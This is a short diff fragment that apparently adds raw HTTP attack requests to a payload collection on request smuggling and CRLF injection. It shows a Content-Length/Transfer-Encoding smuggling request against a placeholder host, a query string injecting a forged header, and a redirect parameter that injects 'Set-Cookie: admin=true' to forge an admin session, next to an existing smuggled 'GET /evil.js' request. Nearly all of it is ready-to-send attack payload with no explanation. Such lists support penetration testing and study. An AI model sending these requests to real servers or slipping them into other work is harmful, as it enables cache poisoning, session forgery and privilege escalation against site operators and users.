@@ -210,3 +210,20 @@ Transfer-Encoding: chunked
 
 GET /evil.js HTTP/1.1
 Host: target.com
+
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 40
+Transfer-Encoding: chunked
+
+0
+
+HTTP/1.1\r\nFoo: baarr\r\n\r\n
+
+
+GET /vuln?input=%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1
+Host: target.com
+
+
+
+GET /vuln?redirect=example.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1
